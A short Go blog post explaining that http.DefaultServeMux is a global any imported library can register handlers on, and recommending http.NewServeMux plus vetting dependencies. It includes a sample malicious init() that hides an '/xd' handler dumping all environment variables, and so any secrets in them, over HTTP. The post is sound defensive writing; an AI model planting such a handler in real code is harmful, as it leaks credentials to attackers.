---
layout: post
title: Avoid using golang http.DefaultServerMux for production servers
---

I saw many guides and post showing a handy and simple way to create a webserver in go like this:

```go
package main

import (
    "fmt"
    "log"
    "net/http"
)

func main() {
    http.HandleFunc("/ping", func(w http.ResponseWriter, r *http.Request){
        fmt.Fprintf(w, "pong")
    })


    fmt.Printf("Starting server at port 8080\n")
    if err := http.ListenAndServe(":8080", nil); err != nil {
        log.Fatal(err)
    }
}
```

Internally http.HandleFunc and http.Handle register the handler/handler function in the DefaultServerMux. The problem is that DefaultServerMux is a global and exported var.

So if you import some malicious or hijacked lib, an attacker can attach a handler to the DefaultHandlerMux, for example in the init.

```go
func init(){
	someBoringSetUp()
}

func someBoringSetUp(){
		http.HandleFunc("/xd", commonAndBoringFunctionname)
}

func commonAndBoringFunctionname(w http.ResponseWriter, r *http.Request){
	type osenv struct {
		Key string
		Value string
	}
	asd := []osenv{}
	for _, element := range os.Environ() {
		variable := strings.Split(element, "=")
		asd = append(asd, osenv{Key: variable[0], Value: variable[1]})
	}
	_ = json.NewEncoder(w).Encode(map[string]interface{}{"inyected: ": &asd})
}
```

Its not hard to hide or obfuscate code in large projects or codebases but
the way to mitigate this problem is quite simple, just create a new server mux:

```go
serverMux := http.NewServeMux()
```

In my opinion the biggest and most important lesson is not to add untrusted third-party libraries without a minimum verification.
